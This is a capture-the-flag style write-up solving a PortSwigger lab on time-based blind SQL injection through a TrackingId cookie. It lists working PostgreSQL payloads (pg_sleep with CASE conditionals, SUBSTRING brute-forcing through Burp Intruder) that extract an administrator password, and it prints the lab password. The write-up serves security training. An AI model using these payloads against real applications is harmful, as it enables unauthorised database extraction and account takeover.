# 🎯 Platform: PortSwigger
### 📝 Target: Lab - Blind SQL injection with time delays and information retrieval

> **Vulnerability Location:** `TrackingId` cookie
> **Goal:** Exploit the time-based blind SQL injection to extract the `administrator` password and log in.

---

## 🔍 Analysis & Attack Flow
### The Mechanism (Time-Based Inference)
*   **Concept:** Since the application is completely blind (no data, no visible errors), we ask the database True/False questions.
*   **The Oracle:** We use a conditional `CASE` statement.
    *   If the condition is **True**, we tell the database to sleep for 5 seconds (`pg_sleep(5)`).
    *   If the condition is **False**, we tell it to sleep for 0 seconds (`pg_sleep(0)`).
*   **The Indicator:** By checking the **"Response completed"** time in Burp Suite, we can infer the answer. Any response taking ~5000 milliseconds (5 seconds) means our condition was True.

---

## 🚀 Exploitation Steps

### Step 1: Verify the Vulnerability
*   **Payload:** `TrackingId=xyz' || pg_sleep(6)--`
*   **Result:** The response took ~6 seconds, confirming the backend is PostgreSQL and is vulnerable to time-based injection.

### Step 2: Confirm the Target User
*   **Payload:**
    ```sql
    ' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END from users)--
    ```
*   **Result:** Response delayed by 5 seconds. This confirms the `administrator` user exists in the `users` table.

### Step 3: Find the Password Length
*   **Payload:**
    ```sql
    ' || (SELECT CASE WHEN (username='administrator' and LENGTH(password)=20) THEN pg_sleep(5) ELSE pg_sleep(0) END from users)--
    ```
*   **Result:** Response delayed by 5 seconds, confirming the password is exactly **20 characters** long.

### Step 4: Brute-Force the Password Characters
*   **Tool:** Burp Suite Intruder (Cluster Bomb attack type)
*   **Payload Format:**
    ```sql
    ' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)--
    ```
*   **Configuration:**
    *   `Payload 1` (Positions): Numbers 1 to 20.
    *   `Payload 2` (Characters): a-z, 0-9.
*   **Analysis:** In Intruder results, sort the table by the **"Response completed"** column.
*   **Key Indicator:** Any request that took **> 5000 milliseconds** is a correct character. (e.g., Response time 5189ms for position 1 = 'r').
*   **Extracted Password:** `rqq0df0fjnte233ll9bn`

---

## 🛠️ Execution
1. Capture the request containing the `TrackingId` cookie.
2. Verify the injection and enumerate the password length.
3. Send the request to Intruder and configure the `SUBSTRING` payload to test each character position.
4. Extract the characters by filtering/sorting for the 5-second time delays.
5. Log in to the application using username `administrator` and the extracted password.
6. 🎉 **Lab is solved!**
